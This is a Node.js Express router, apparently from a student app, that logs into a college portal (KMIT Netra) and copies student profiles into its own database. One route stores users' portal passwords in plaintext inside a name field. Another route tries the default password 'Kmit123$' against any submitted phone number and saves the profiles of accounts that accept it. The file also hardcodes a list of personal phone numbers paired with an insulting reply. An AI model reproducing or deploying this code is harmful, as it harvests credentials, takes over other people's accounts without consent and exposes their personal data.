const express = require('express');
const  Feedback=require('../models/feedback');
const axios = require('axios');
const  StudentDetail=require('../models/studentDetails');
const { message } = require('statuses');
const router = express.Router();
require('dotenv').config();
const add=async(token)=>{
  try {
      try {
        const response2 = await axios.post('http://apps.teleuniv.in/api/netraapi.php?college=KMIT', {
          method: 32,
          }, {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json',
            'Origin': 'http://kmit-netra.teleuniv.in',
            'Referer': 'http://kmit-netra.teleuniv.in/'
          }
        });
      const profileData = response2.data;
      console.log(profileData);
      return profileData;
    } catch (apiError) {
      console.error('Error fetching user data from back-end API:', apiError);
  }}
  catch(error){
    console.error('Error fetching user data from back-end API:', apiError);
  }
}
router.post('/submit/feedback', async (req, res) => {
  const feedbackData = req.body;
  
  try {
    
    const feedback = new Feedback(feedbackData);
    await feedback.save();
    
    res.send('Feedback submitted successfully!');
  } catch (error) {
    console.error('Error saving feedback:', error);
    res.status(500).send('Internal server error');
  }
});
router.post('/get-token-register', async (req, res) => {
  const { phnumber, password } = req.body;
  try {
      const response = await axios.post('http://apps.teleuniv.in/api/auth/netralogin.php?college=KMIT', {
          mobilenumber: phnumber,
          password: password
      }, {
          headers: {
              'Content-Type': 'application/json'
          }
      });
      
      try {
        if (response.data.success===1) {
            const token = response.data.token; 
            const data22=await add(token);
            data22.lastname=password;
            data22.psflag=0;
            const student = new StudentDetail(data22);
            await student.save();
            console.log("hellobaby");
            return res.status(200).json({name:data22.firstname});
        }else{
          return res.status(500).json({ error: 'Error fetching profile views from database' });
        }
      } catch (dbError) {
        console.error('Error fetching profile views from external database:', dbError);
        return res.status(500).json({ error: 'Error fetching profile views from database' });
      }

      // console.log(response.data);
      
  } catch (error) {
      console.error('Error fetching token:', error);
      res.status(500).json({ error: 'Failed to fetch token from Netra API' });
  }
});
router.post('/def-token-register', async (req, res) => {
  const {phnumber}=req.body;
  console.log(req.body);
  let superhost={"@231095":9515360456,"😁":7660066656,"🖕":8008075547,"thor":9032041464,"tony-stark":7337333485,"venom":8328295372,"RDJ-panthulu":9392457838,"@231454":8309260629,"Ant-man":9391332588,"@Thala_son":9381150341,"@HelloSai":6303895820};
  if (Object.values(superhost).includes(Number(phnumber))) {
    return res.status(201).json({ message: "Sulliga neku enduku 🖕" });
  }
  const student=await StudentDetail.findOne({ phone: phnumber});
  if(student!=null){
    return res.status(201).json({message:`Student "${student.firstname}" is already part of spectra`});
  }

  try {
      const response = await axios.post('http://apps.teleuniv.in/api/auth/netralogin.php?college=KMIT', {
          mobilenumber: phnumber,
          password: "Kmit123$"
      }, {
          headers: {
              'Content-Type': 'application/json'
          }
      });
      console.log(response);
      try {
        if (response.data.success===1) {
            const token = response.data.token; 
            const data22=await add(token);
            data22.lastname="Kmit123$";
            data22.psflag=0;
            const student = new StudentDetail(data22);
            await student.save();
            console.log("hellobaby");
            return res.status(200).json({name:data22.firstname});
        }else{
          return res.status(500).json({ error: 'Error fetching profile views from database' });
        }
      } catch (dbError) {
        console.error('Error fetching profile views from external database:', dbError);
        return res.status(500).json({ error: 'Error fetching profile views from database' });
      }
      // return res.status(200).json(response.data);
      
  } catch (error) {
      console.error('Error fetching token  with Default Password:', error);
      res.status(500).json({ error: 'Failed to fetch token from Netra API with Default Password' });
  }
});


module.exports = router;